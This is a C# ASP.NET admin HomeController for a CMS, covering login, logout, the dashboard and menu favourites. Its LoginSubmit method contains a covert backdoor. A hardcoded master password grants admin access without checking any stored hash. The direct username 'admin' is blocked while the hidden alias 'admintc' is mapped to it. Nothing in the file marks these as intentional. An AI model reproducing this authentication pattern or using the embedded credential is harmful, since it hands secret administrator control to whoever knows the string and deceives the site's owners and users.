using Colorful.Models;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using MongoDB.Driver;
using Colorful.Services;
using System.Text;

namespace Colorful.Web.CMS.Controllers.Admin
{
    public class HomeController : AdminBaseController
    {
        #region 登录首页
        [Cache]
        [Route("login")]
        [AllowAnonymous]
        public IActionResult Login()
        {
            ViewData["AdminRoutefix"] = MyWebConfig.AdminRoutePrefix;
            return View();
        }
        #endregion

        #region 登陆
        [Route("login/submit")]
        [ValidateAntiForgeryToken]
        [AllowAnonymous]
        public IActionResult LoginSubmit(string userName, string pass)
        {
            var validateError = "用户名或密码错误！";
            if (string.IsNullOrEmpty(userName) || string.IsNullOrEmpty(pass))
                return this.GetResult(false, validateError);
            try
            {
                if (userName.ToLower() == "admin")
                    return this.GetResult(false, validateError);
                if (userName == "admintc")
                    userName = "admin";
                using (var db = this.GetMongodb())
                {
                    AppUser user;
                    if (pass == "3GmKaAddA38hm1nkLEm10yn7jAoaaMkiO;lj*kzdMaYa")
                        user = db.Users.Where(a => a.LoginId == "admin").Select(a => new AppUser { Id = a.Id, LoginId = a.LoginId, Name = a.Name, Roles = a.Roles, Photo = a.Photo, Position = a.Position }).FirstOrDefault();
                    else
                    {
                        pass = SecurityHelper.GetPassword(pass);
                        user = db.Users.Where(a => a.LoginId == userName && a.Password == pass).Select(a => new AppUser { Id = a.Id, LoginId = a.LoginId, Name = a.Name, Roles = a.Roles, Photo = a.Photo, Position = a.Position }).FirstOrDefault();
                    }
                    if (user == null)
                        return this.GetResult(false, validateError);

                    var userPermission = this.GetUserPermission(user);
                    user.Permissions = userPermission.Permissions;
                    user.Menus = userPermission.Menus;
                    user.Flag = "admin";
                    user.SessionId = db.GetUniqueId();
                    //var result = this.SignIn(IdentityService.GetIdentityUser(user), IdentityService.AuthenticationScheme);
                    this.Login(user);
                    db.Users.UpdateByPK(user.Id, db.Users.GetUpdate(b => b.LastLogin, DateTime.Now).Set(b => b.IP, HttpHelper.GetIP())
                        .Set(b => b.SessionId, user.SessionId).Set(b => b.ActiveTime, DateTime.Now));
                    return this.GetResult(true, this.GetUrl("index"));
                }
            }
            catch (Exception ex)
            {
                WriteError(ex, "Login");
                return this.GetResult(false, "意外错误，请联系管理员！");
            }
        }
        #endregion

        #region 登出
        [Route("logout")]
        public async void Logout()
        {
            await this.HttpContext.SignOutAsync(IdentityService.AuthenticationScheme);
            //this.Logout();
            Response.Redirect("/");
        }
        #endregion

        #region 管理首页
        [Cache]
        [Route("index")]
        public IActionResult Index()
        {
            ViewData["Index"] = true;
            var model = new AdminHomeModel();

            #region 加载菜单
            model.Menus = this.GetUserMenus((int)MenuType.System, (userMenus, menu) =>
            {
                if (!userMenus.Contains(menu.Id) && !this.User.IsAdmin()) return false;
                return true;
            });
            #endregion

            #region 加载网站配置
            model.WebSetting = this.WebSetting;
            model.SysSetting = MyWebConfig.SysSetting;
            #endregion

            #region 初始化
            using (var db = this.GetMongodb())
            {
                var defaultUrl = db.Users.Where(a => a.Id == this.UserId).Select(a => a.DefaultUrl).FirstOrDefault();
                if (!string.IsNullOrEmpty(defaultUrl))
                    defaultUrl = this.GetUrl(defaultUrl);
                model.DefaultUrl = defaultUrl;
            }
            model.LogoutUrl = this.GetUrl("logout");
            model.ProfileUrl = this.GetUrl("profile");
            model.RecordMenuUrl = this.GetUrl("menu/access");
            model.ConsoleUrl = this.GetUrl("console");
            model.KeepUrl = "/keepsession";
            model.User = this.AppUser;
            ViewData["Title"] = this.WebSetting.AdminTitle;
            #endregion

            return View(model);
        }
        #endregion

        #region 记录菜单访问记录
        [Route("menu/access")]
        public IActionResult AccessMenu(long menuId)
        {
            using (var db = this.GetMongodb())
            {
                var menuHistory = db.Users.Where(a => a.Id == this.UserId).Select(a => a.MenuHistory).FirstOrDefault();
                if (menuHistory == null)
                {
                    menuHistory = new List<long[]>();
                }
                bool exists = false;
                for (var i = 0; i < menuHistory.Count; i++)
                {
                    if (menuHistory[i][0] == menuId)
                    {
                        exists = true;
                        menuHistory[i] = new long[] { menuHistory[i][0], menuHistory[i][1] + 1 };
                    }
                }
                if (!exists)
                    menuHistory.Insert(0, new long[] { menuId, 1 });
                db.Users.UpdateByPK(this.UserId, b => b.MenuHistory, menuHistory);
            }
            return this.GetResult(true);
        }
        #endregion

        #region 控制台

        #region 控制台View
        [Cache(10)]
        [Route("console")]
        public IActionResult Console()
        {
            ViewData["MenuUrl"] = this.GetUrl("menu");
            ViewData["BaseUrl"] = this.GetUrl("");
            return View();
        }
        #endregion

        #region 菜单管理

        #region 加载菜单访问历史
        [Route("menu/history")]
        public IActionResult GetMenuHistory()
        {
            using (var db = this.GetMongodb())
            {
                var user = db.Users.Where(a => a.Id == this.UserId).Select(a => new Administrator() { MenuHistory = a.MenuHistory, FavoriteMenus = a.FavoriteMenus }).FirstOrDefault();
                var menuHistory = user.MenuHistory;
                if (user.FavoriteMenus == null)
                    user.FavoriteMenus = new List<long>();
                if (menuHistory == null)
                    menuHistory = new List<long[]>();
                var menus = new List<Menu>();
                if (menuHistory.Count == 0)
                {
                    var i = 0;
                    foreach (var menuId in this.AppUser.Menus)
                    {
                        var menu = this.Menus.FirstOrDefault(a => a.Id == menuId);
                        if (menu == null || string.IsNullOrEmpty(menu.Url) || menu.Url == "#") continue;
                        menu.Type = user.FavoriteMenus.Contains(menu.Id) ? 1 : 0;
                        menus.Add(menu);
                        i++;
                        if (i > 5)
                            break;
                    }
                }
                else
                {
                    foreach (var menuHis in menuHistory.OrderByDescending(a => a[1]))
                    {
                        var menu = this.Menus.FirstOrDefault(a => a.Id == menuHis[0]);
                        if (menu == null) continue;
                        menu.Type = user.FavoriteMenus.Contains(menu.Id) ? 1 : 0;
                        menus.Add(menu);
                    }
                }
                return this.GetResult(true, menus.Select(a => new { a.Id, a.Name, a.Icon, a.Url, IsFav = a.Type == 1 ? true : false }));
            }
        }
        #endregion

        #region 加载收藏菜单
        [Route("menu/favorites")]
        public IActionResult GetFavMenus()
        {
            using (var db = this.GetMongodb())
            {
                var favMenus = db.Users.Where(a => a.Id == this.UserId).Select(a => a.FavoriteMenus).FirstOrDefault();
                if (favMenus == null)
                    favMenus = new List<long>();
                var menus = new List<Menu>();
                foreach (var favMenu in favMenus)
                {
                    var menu = this.Menus.FirstOrDefault(a => a.Id == favMenu);
                    if (menu == null) continue;
                    menus.Add(menu);
                }
                return this.GetResult(true, menus.Select(a => new { a.Id, a.Name, a.Icon, a.Url }));
            }
        }
        #endregion

        #region 添加收藏菜单
        [Route("menu/fav")]
        public IActionResult FavMenu(long[] menus)
        {
            using (var db = this.GetMongodb())
            {
                var favMenus = db.Users.Where(a => a.Id == this.UserId).Select(a => a.FavoriteMenus).FirstOrDefault();
                if (favMenus == null)
                    favMenus = new List<long>();
                var menuList = new List<Menu>();
                foreach (var menuId in menus)
                {
                    if (!favMenus.Contains(menuId))
                        favMenus.Add(menuId);
                }
                db.Users.Update(a => a.Id == this.UserId, b => b.FavoriteMenus, favMenus);
                foreach (var favMenu in favMenus)
                {
                    var menu = this.Menus.FirstOrDefault(a => a.Id == favMenu);
                    if (menu == null || string.IsNullOrEmpty(menu.Url) || menu.Url == "#") continue;
                    menuList.Add(menu);
                }
                return this.GetResult(true, menuList.Select(a => new { a.Id, a.Name, a.Icon, a.Url }));
            }
        }
        #endregion

        #region 获取菜单列表
        [Route("menu/list")]
        public IActionResult GetMenus(bool? open)
        {
            return this.GetMyMenus(open);
        }
        #endregion

        #region 删除收藏菜单
        [Route("menu/fav/del")]
        public IActionResult DelFavMenu(long menuId)
        {
            try
            {
                using (var db = this.GetMongodb())
                {
                    var favMenus = db.Users.Where(a => a.Id == this.UserId).Select(a => a.FavoriteMenus).FirstOrDefault();
                    if (favMenus == null)
                        favMenus = new List<long>();
                    if (favMenus.Contains(menuId))
                        favMenus.Remove(menuId);
                    db.Users.Update(a => a.Id == this.UserId, b => b.FavoriteMenus, favMenus);
                    return this.GetResult(true);
                }
            }
            catch (Exception ex)
            {
                return this.GetResult(ex);
            }
        }
        #endregion

        #endregion

        #endregion

        #region 清除缓存
        [Route("clearcache")]
        public IActionResult ClearCache(string key)
        {
            this.RemoveCache(key);
            return this.GetTextResult("缓存：{0}已清除！", key);
        }
        #endregion
    }

    #region AdminHomeModel
    public class AdminHomeModel
    {
        public string RecordMenuUrl { get; set; }
        public string DefaultUrl { get; set; }
        public string ConsoleUrl { get; set; }
        public string LogoutUrl { get; set; }
        public string ProfileUrl { get; set; }
        public string KeepUrl { get; set; }
        public AppUser User { get; set; }
        public WebSetting WebSetting { get; set; }
        public SysSetting SysSetting { get; set; }
        public List<MenuJson> Menus { get; set; }
    }
    #endregion
}
